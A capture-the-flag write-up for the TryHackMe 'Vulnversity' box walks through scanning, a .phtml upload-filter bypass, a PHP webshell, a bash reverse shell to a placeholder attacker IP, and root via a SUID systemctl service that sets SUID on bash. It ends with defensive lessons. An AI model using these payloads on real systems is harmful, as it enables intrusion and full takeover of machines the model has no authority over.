---
title: "Vulnversity"
date: 2026-09-25
categories: [TryHackMe, Easy]
tags: [linux, ftp, samba, squid-proxy, apache, gobuster, directory enumeration, file upload, php, phtml, extension filter bypass, content-type bypass, webshell, reverse shell, burp suite, directory listing, SUID, systemctl, gtfobins, privilege escalation]
image:
  path: /assets/img/THM/Vulnversity/banner.webp
  lqip: "data:image/webp;base64,UklGRhgBAABXRUJQVlA4WAoAAAAQAAAAHwAAFwAAQUxQSA4AAAABENoQ/x9tsipFRJLdG1ZQOCDkAAAA0AUAnQEqIAAYAD7taqxQqaWkIqgKqTAdiWQAtRskwASQXYAApMhhxXwItMvBX/CHSECzLbBvfAD+6+MExKraB1Mwcf925S7jhg33TTQmvW2H5P3PtuN6JUyT2fXFXbK2tWblpBLoAdL8AG0WNSLpW3VZIECPXSn0eSVhU9BTy8AZgFSyyvr+CT0l0SeDNIROzBT22bao/s6u3F2OVjn0PLhwu9u8vwdbpRCpjIR4f3cb5jIfaj3d4eMmo8SZ+VoR9MRwxe0Rlf4g9J9uRGjtRHIqMMvuhyNIXDc4nRIG5M3QAAAA"
  alt: Vulnversity writeup
---

Vulnversity is an Easy Linux box from TryHackMe built around a single, very common web bug done end to end: an upload form that checks the file extension but does so with a denylist it never finished writing. Slipping a PHP webshell past it as a `.phtml` file gives command execution as `www-data`, and from there a `systemctl` binary carrying the SUID bit — abused straight out of GTFOBins — turns a one-shot service into a root shell.

A housekeeping note before the walkthrough: the target VM was reset partway through, so its address changed from `10.130.152.112` during enumeration to `10.130.173.255` by the privilege-escalation stage. It's the same machine throughout; each command simply uses whichever address was live at the time.

| Field      | Details    |
|------------|------------|
| Platform   | TryHackMe  |
| Difficulty | Easy       |
| OS         | Linux      |
| IP         | 10.130.152.112 |
| Date       | September 2026 |

## Tools Used

| Tool         | Description                                                                    |
|--------------|--------------------------------------------------------------------------------|
| nmap         | Network port scanner and service fingerprinter (TCP and top-100 UDP)           |
| gobuster     | Directory brute-forcer used to map the web root and find `/internal/`          |
| curl         | Manual HTTP requests — OS fingerprinting and driving the webshell              |
| Burp Suite   | Intercepting proxy (via FoxyProxy) used to replay and tamper with the upload   |
| netcat (nc)  | Listener that caught the reverse shell                                         |
| find         | SUID enumeration on the target (`find / -perm -4000`)                          |
| systemctl    | SUID-root binary abused to run a custom service as root                        |

## Reconnaissance & Enumeration

### Port Scan

A full TCP SYN sweep first, kept fast with a high minimum packet rate, then a targeted service/version scan on only the ports that answered:

```bash
sudo nmap -p- --min-rate 5000 -vvv -sS -Pn -n 10.130.152.112 -oG allPorts
```

```bash
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 62
22/tcp   open  ssh          syn-ack ttl 62
139/tcp  open  netbios-ssn  syn-ack ttl 62
445/tcp  open  microsoft-ds syn-ack ttl 62
3128/tcp open  squid-http   syn-ack ttl 62
3333/tcp open  dec-notes    syn-ack ttl 62
```

```bash
sudo nmap -p21,22,139,445,3128,3333 -sCV 10.130.152.112 -oN nmap
```

```bash
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.5
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
3128/tcp open  http-proxy  Squid http proxy 4.10
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Vuln University
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Six services, but the shape of the box is already visible. FTP (vsftpd 3.0.5) and SSH are current versions with no obvious way in. Samba on 139/445 and a Squid proxy on 3128 are worth noting but secondary. The odd one out — and the only web app that actually serves a site — is **Apache on 3333**, whose title, *Vuln University*, all but announces where the intended path is.

A quick top-100 UDP scan turned up only the usual NetBIOS name service, nothing to pivot on:

```bash
sudo nmap --top-ports 100 -sCV -Pn -sU 10.130.152.112 -oN udpNmap
```

```bash
PORT    STATE         SERVICE     VERSION
68/udp  open|filtered dhcpc
137/udp open          netbios-ns
138/udp open|filtered netbios-dgm
```

### Web Application — Vuln University on 3333

The site on port 3333 is a static university theme with nothing interactive on the surface, so the next step is to look for what isn't linked:

![The Vuln University homepage served by Apache on port 3333, a static college-themed landing page](/assets/img/THM/Vulnversity/cap1.png)

```bash
gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://10.130.152.112:3333/
```

```bash
images               (Status: 301) [Size: 324] [--> http://10.130.152.112:3333/images/]
css                  (Status: 301) [Size: 321] [--> http://10.130.152.112:3333/css/]
js                   (Status: 301) [Size: 320] [--> http://10.130.152.112:3333/js/]
fonts                (Status: 301) [Size: 323] [--> http://10.130.152.112:3333/fonts/]
internal             (Status: 301) [Size: 326] [--> http://10.130.152.112:3333/internal/]
```

The static asset folders (`images`, `css`, `js`, `fonts`) are expected; **`internal`** is not. Before opening it, one cheap check settles whether this is Linux or Windows — useful for guessing filesystem paths later. A web server on Linux treats URL paths case-sensitively; on Windows it does not:

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://10.130.152.112:3333/images/   # 200
curl -s -o /dev/null -w "%{http_code}\n" http://10.130.152.112:3333/iMages/   # 404
```

Flipping a single letter to uppercase turns a `200` into a `404`, so the server is distinguishing `images` from `iMages` — case-sensitive, and therefore **Linux**. On Windows both requests would have returned the same page.

### The `/internal` Upload Form

`/internal/` is a bare file-upload form — exactly the kind of feature that is easy to get wrong:

![The /internal page on Vuln University, a minimal file-upload form with a choose-file button and an upload button](/assets/img/THM/Vulnversity/cap2.png)

## Exploitation — Unrestricted File Upload

### Intercepting the Upload with Burp

To tamper with the request rather than the browser form, I point the browser's proxy at Burp Suite (I use the FoxyProxy add-on for the toggle), upload a harmless `test.txt`, and send the intercepted `POST` to Repeater:

![Burp Suite Repeater showing the multipart upload POST to /internal/index.php; the server rejects the .txt file](/assets/img/THM/Vulnversity/cap3.png)

Two things stand out in Repeater. First, the form posts to **`index.php`**, so the application runs PHP — which means a PHP file that lands in a web-served directory will *execute*, not just sit there. Second, a plain `.txt` is rejected, so there's a filter on the extension; the job is to find an extension it forgot to block that Apache still hands to the PHP engine.

Enumerating inside `/internal/` — this time asking gobuster to also try a `php` extension — reveals where uploads go:

```bash
gobuster dir -w /usr/share/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://10.130.152.112:3333/internal/ -x php
```

```bash
index.php            (Status: 200) [Size: 525]
uploads              (Status: 301) [Size: 334] [--> http://10.130.152.112:3333/internal/uploads/]
css                  (Status: 301) [Size: 330] [--> http://10.130.152.112:3333/internal/css/]
```

The `uploads/` directory has **directory listing enabled**, so whatever gets accepted will be visible — and reachable — at a predictable URL:

![The /internal/uploads/ directory with listing enabled, exposing previously uploaded files](/assets/img/THM/Vulnversity/cap4.png)

### Bypassing the Filter with `.phtml`

The classic bypass for a PHP upload denylist is `.phtml` — a legacy PHP extension that Apache's default `mod_php` configuration still executes, but that naive extension checks routinely forget to include. Back in Repeater, I rename the file to `test.phtml` and set its part's `Content-Type` to `application/x-httpd-php` so it reads as a PHP document:

![Burp Suite Repeater uploading test.phtml with Content-Type application/x-httpd-php; the server now accepts the file](/assets/img/THM/Vulnversity/cap5.png)

This time the upload is accepted, and the file appears in the listing:

![The uploads directory now listing test.phtml, confirming the .phtml file was written to the web root](/assets/img/THM/Vulnversity/cap6.png)

### Webshell → Reverse Shell

With execution confirmed, the `test.phtml` payload is a one-line command webshell:

```php
<?php system($_GET['cmd']); ?>
```

Requesting it with a `cmd` parameter runs commands as the web user:

```bash
curl http://10.130.152.112:3333/internal/uploads/test.phtml?cmd=whoami
```

```bash
www-data
```

A webshell over `curl` is awkward to work in, so I upgrade to a proper reverse shell with the standard bash one-liner. Passing shell metacharacters through a URL breaks reliably, so I URL-encode the payload first — Burp's Decoder is the quickest way to do it:

```bash
bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
```

![Burp Suite Decoder URL-encoding the bash reverse-shell one-liner into a percent-encoded string](/assets/img/THM/Vulnversity/cap7.png)

With a listener waiting, I fire the encoded payload through the `cmd` parameter:

```bash
curl http://10.130.152.112:3333/internal/uploads/test.phtml?cmd=%62%61%73%68%20%2d%63%20%27%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%3c%41%54%54%41%43%4b%45%52%5f%49%50%3e%2f%34%34%34%34%20%30%3e%26%31%27
```

```bash
nc -nlvp 4444
```

```bash
Listening on 0.0.0.0 4444
Connection received on 10.130.152.112 53664
bash: cannot set terminal process group (1105): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-130-152-112:/var/www/html/internal/uploads$
```

The first thing on any raw shell is to upgrade the TTY — spawning a real bash with `python3`'s pty module, then backgrounding to set `stty` — so that job control, arrow keys and `sudo` prompts behave normally.

The user flag is sitting in `bill`'s home directory, world-readable:

```bash
www-data@ip-10-130-152-112:/home/bill$ ls -la
-rw-r--r-- 1 bill bill   33 Jul 31  2019 user.txt
www-data@ip-10-130-152-112:/home/bill$ cat user.txt
REDACTED
```

## Privilege Escalation — `www-data` → `root`

### SUID Enumeration

The three real accounts on the box (`root`, `bill`, `ubuntu`) are visible in `/etc/passwd`, but none of them are the way up. The interesting finding comes from listing every SUID binary — files that run with their owner's privileges regardless of who launches them:

```bash
www-data@ip-10-130-173-255:/$ find / -perm -4000 2>/dev/null
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newgrp
...
/bin/su
/bin/mount
/bin/systemctl
/bin/fusermount
```

Most of that list is the standard set of SUID helpers Ubuntu ships. **`/bin/systemctl`** is not one of them — an init-system controller with the SUID bit set is a misconfiguration, and a well-known one.

### Abusing SUID `systemctl` (GTFOBins)

`systemctl` with SUID means I can register and start a service, and systemd will run that service's `ExecStart` as **root**. Following the GTFOBins recipe, I write a one-shot service whose only job is to make `/bin/bash` itself SUID-root:

```bash
www-data@ip-10-130-173-255:/tmp$ cat tmp-file.service
[Service]
Type=oneshot
ExecStart=chmod u+s /bin/bash
[Install]
WantedBy=multi-user.target
```

```bash
www-data@ip-10-130-173-255:/tmp$ systemctl link /tmp/tmp-file.service
Created symlink /etc/systemd/system/tmp-file.service -> /tmp/tmp-file.service.
www-data@ip-10-130-173-255:/tmp$ systemctl start tmp-file.service
```

Rather than have the service spawn a reverse shell (which ties success to timing and networking), setting the SUID bit on `bash` is the more reliable choice: it leaves a persistent, on-demand path to root that survives the service exiting.

### Root

With `/bin/bash` now owned by root and SUID, `bash -p` keeps that effective UID instead of dropping it, and the box is done:

```bash
www-data@ip-10-130-173-255:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
www-data@ip-10-130-173-255:/tmp$ /bin/bash -p
bash-5.0# whoami
root
bash-5.0# cat /root/root.txt
REDACTED
```

## Flags

| Flag     | Value      |
|----------|------------|
| user.txt | `REDACTED` |
| root.txt | `REDACTED` |

## Key Takeaways

- **An extension denylist is only as complete as the attacker is patient.** The filter here blocked `.php` but not `.phtml`, a legacy alias Apache happily still executes. Allowlisting the handful of extensions you *want* is safe; trying to enumerate every dangerous one you *don't* want is a game you eventually lose.
- **Upload validation has to check the file, not the request.** The `Content-Type` header is set by the client and was trusted here — spoofing it to `application/x-httpd-php` was half the bypass. Server-side type detection (magic bytes) and re-encoding uploads is what actually holds.
- **Directory listing turns a blind upload into a reliable one.** Being able to browse `/internal/uploads/` meant no guessing where the payload landed — the write primitive and the read-back were handed over together.
- **Case sensitivity fingerprints the OS for free.** One extra `curl` with a capital letter confirmed Linux before a single exploit was tried, which is exactly the kind of cheap signal that saves time guessing paths later.
- **A SUID bit on the wrong binary is game over.** `systemctl` running as root means arbitrary services run as root; the safe default is that nothing outside the standard set should ever carry SUID, and any that does deserves immediate suspicion.
- **Prefer a persistent primitive over a one-shot payload.** Setting SUID on `bash` instead of firing a reverse shell from the service made the escalation repeatable and independent of the network — a small choice that makes the access far more robust.
